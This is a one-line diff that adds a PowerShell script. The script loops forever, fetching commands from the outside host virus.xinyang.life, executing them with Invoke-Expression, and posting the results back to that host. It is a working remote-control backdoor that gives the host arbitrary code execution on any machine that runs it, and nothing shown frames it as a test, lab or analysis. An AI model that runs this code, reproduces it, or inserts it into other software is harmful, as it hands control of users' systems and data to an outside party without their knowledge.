@@ -1,0 +1,1 @@
+while(1){$c = Invoke-RestMethod -UseBasicParsing -Uri 'https://virus.xinyang.life/' -Method POST;$r = Invoke-Expression $c.c | Out-String;Invoke-RestMethod -UseBasicParsing -Uri 'https://virus.xinyang.life/result' -Method POST -Body @{r=$r}}
